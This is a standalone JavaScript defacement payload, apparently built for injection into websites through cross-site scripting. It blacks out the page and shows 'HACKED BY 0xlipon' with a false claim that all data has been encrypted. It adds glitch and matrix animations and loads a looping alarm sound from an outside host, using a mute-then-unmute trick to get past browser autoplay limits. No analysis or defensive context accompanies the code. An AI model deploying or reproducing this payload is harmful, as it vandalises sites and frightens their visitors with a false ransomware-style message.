(function() {
    // Create a full-screen black overlay
    var overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = '#000000';  // Black background
    overlay.style.zIndex = 9998;  // Below the text but above everything else
    overlay.style.opacity = '1';  // Fully visible
    document.body.appendChild(overlay);

    // Create a container for the logo and hacking message
    var container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.display = 'flex';
    container.style.flexDirection = 'column';
    container.style.alignItems = 'center';
    container.style.justifyContent = 'center';
    container.style.zIndex = 9999;  // Above the overlay
    document.body.appendChild(container);

    // Add your logo
    var logo = document.createElement('img');
    logo.src = 'https://avatars.githubusercontent.com/u/124679777?v=4';  // Your logo URL
    logo.style.width = '150px';  // Adjust size as needed
    logo.style.marginBottom = '20px';  // Space between logo and text
    container.appendChild(logo);

    // Create a hacking note message
    var message = document.createElement('div');
    message.innerHTML = `
        <h1 style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 3em;">
            HACKED BY 0xlipon
        </h1>
        <p style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 1.5em;">
            Your security has been compromised. Contact Admin immediately.
        </p>
        <p style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 1.2em;">
            System integrity compromised. All data has been encrypted.
        </p>
    `;
    container.appendChild(message);

    // Add a blinking effect to the message
    var blinkStyle = document.createElement('style');
    blinkStyle.type = 'text/css';
    blinkStyle.appendChild(document.createTextNode(`
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        h1, p {
            animation: blink 1s infinite;
        }
    `));
    document.head.appendChild(blinkStyle);

    // Add a glitch effect to the message
    var glitchStyle = document.createElement('style');
    glitchStyle.type = 'text/css';
    glitchStyle.appendChild(document.createTextNode(`
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        h1 {
            animation: glitch 0.5s infinite;
        }
    `));
    document.head.appendChild(glitchStyle);

    // Add a matrix-style green code rain effect
    var matrixStyle = document.createElement('style');
    matrixStyle.type = 'text/css';
    matrixStyle.appendChild(document.createTextNode(`
        @keyframes matrix {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent 90%, #000000 100%);
            z-index: 9997;
            pointer-events: none;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            color: #00FF00;
            font-family: 'Courier New', monospace;
            font-size: 1.2em;
            animation: matrix 5s linear infinite;
        }
    `));
    document.head.appendChild(matrixStyle);

    // Create matrix code rain
    var matrixContainer = document.createElement('div');
    matrixContainer.className = 'matrix';
    document.body.appendChild(matrixContainer);

    function createMatrixCode() {
        var span = document.createElement('span');
        span.textContent = String.fromCharCode(Math.floor(Math.random() * 94) + 33);  // Random ASCII character
        span.style.left = Math.random() * window.innerWidth + 'px';
        span.style.animationDuration = Math.random() * 3 + 2 + 's';  // Random speed
        matrixContainer.appendChild(span);

        // Remove span after animation ends
        setTimeout(() => span.remove(), 7000);
    }

    // Spawn matrix code every 100ms
    setInterval(createMatrixCode, 100);

    // Add a warning sound with autoplay
    var audio = new Audio('https://xss0r.com/Resources/warning.mp3');
    audio.loop = true;

    // Mute initially to allow autoplay, then unmute after a short delay
    audio.muted = true;
    audio.play().then(() => {
        // Unmute after the audio starts playing
        setTimeout(() => {
            audio.muted = false;
        }, 1000);  // 1-second delay to ensure autoplay works
    }).catch((error) => {
        console.error('Audio autoplay failed:', error);
    });
})();
